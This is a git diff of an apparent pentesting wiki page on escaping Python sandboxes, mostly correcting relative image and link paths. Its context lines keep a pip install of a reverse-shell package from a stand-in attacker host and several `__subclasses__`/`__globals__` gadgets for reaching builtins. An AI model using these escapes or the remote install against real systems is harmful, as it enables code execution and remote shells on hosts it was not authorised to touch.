@@ -47,7 +47,7 @@ Remember that the _**open**_ and _**read**_ functions can be useful to **read fi
 
 Python try to **load libraries from the current directory first** \(the following command will print where is python loading modules from\): `python3 -c 'import sys; print(sys.path)'`
 
-![](../../.gitbook/assets/image%20%28533%29.png)
+![](../../../.gitbook/assets/image%20%28533%29.png)
 
 ## Bypass pickle sandbox with default installed python packages
 
@@ -83,7 +83,7 @@ pip.main(["install", "http://attacker.com/Rerverse.tar.gz"])
 
 You can download the package to create the reverse shell here. Please, note that before using it you should **decompress it, change the `setup.py`, and put your IP for the reverse shell**:
 
-{% file src="../../.gitbook/assets/reverse.tar.gz" %}
+{% file src="../../../.gitbook/assets/reverse.tar.gz" %}
 
 {% hint style="info" %}
 This package is called `Reverse`.However, it was specially crafted so when you exit the reverse shell the rest of the installation will fail, so you **won't leave any extra python package installed on the server** when you leave.
@@ -173,7 +173,7 @@ get_flag.__globals__['__builtins__']
 [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"]
 ```
 
-[**Below there is a bigger function**](bypass-python-sandboxes.md#recursive-search-of-builtins-globals) to find tens/**hundreds** of **places** were you can find the **builtins**.
+[**Below there is a bigger function**](./#recursive-search-of-builtins-globals) to find tens/**hundreds** of **places** were you can find the **builtins**.
 
 #### Python2 and Python3
 
@@ -221,7 +221,7 @@ class_obj.__init__.__globals__
 [<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
 ```
 
-[**Below there is a bigger function**](bypass-python-sandboxes.md#recursive-search-of-builtins-globals) to find tens/**hundreds** of **places** were you can find the **globals**.
+[**Below there is a bigger function**](./#recursive-search-of-builtins-globals) to find tens/**hundreds** of **places** were you can find the **globals**.
 
 ## Discover Arbitrary Execution
 
@@ -371,7 +371,7 @@ This is just **awesome**. If you are **looking for an object like globals, built
 {% endhint %}
 
 ```python
-import os, sys
+import os, sys # Import these to find more gadgets
 
 SEARCH_FOR = {
     # Misc
@@ -485,6 +485,10 @@ def main():
 if __name__ == "__main__":
     main()
 ```
+
+You can check the output of this script in this page:
+
+{% page-ref page="output-searching-python-internals.md" %}
 
 ## Python Format String
 
